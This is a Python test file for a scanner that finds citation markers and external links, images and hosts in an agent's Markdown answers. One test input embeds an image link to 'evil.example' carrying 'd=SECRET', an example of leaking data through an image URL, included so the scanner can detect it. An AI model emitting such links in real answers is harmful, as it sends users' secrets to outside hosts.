"""Agent 回答的 Markdown 引用与外部资源解析测试。

@author 称霸幼儿园
"""

import json
from pathlib import Path

import pytest

from agents.knowledge_retrieval.citations import scan_answer

FIXTURES = json.loads(
    (Path(__file__).parent / "fixtures" / "citation-markers.json").read_text(encoding="utf-8")
)


@pytest.mark.parametrize("case", FIXTURES, ids=lambda case: case["name"])
def test_shared_citation_markers(case):
    """前后端共享用例按正文语义识别引用编号。

    :param case: Markdown 输入与预期编号
    """
    assert scan_answer(case["input"]).indices == case["indices"]


def test_scan_reports_excluded_candidates_and_external_resources():
    """解析结果只统计排除候选、外部链接、外部图片及主机名。"""
    result = scan_answer(
        "arr[1] [外链](https://example.com/path) "
        "![外站](//evil.example/x.png?d=SECRET) "
        "![本站](/api/proxy/file/objects/9/redirect) "
        "[相对链接](notes/1) ![相对路径](images/a.png)"
    )

    assert result.indices == []
    assert result.excluded_candidates == 1
    assert result.external_link_count == 1
    assert result.external_image_count == 1
    assert result.external_hosts == ["example.com", "evil.example"]
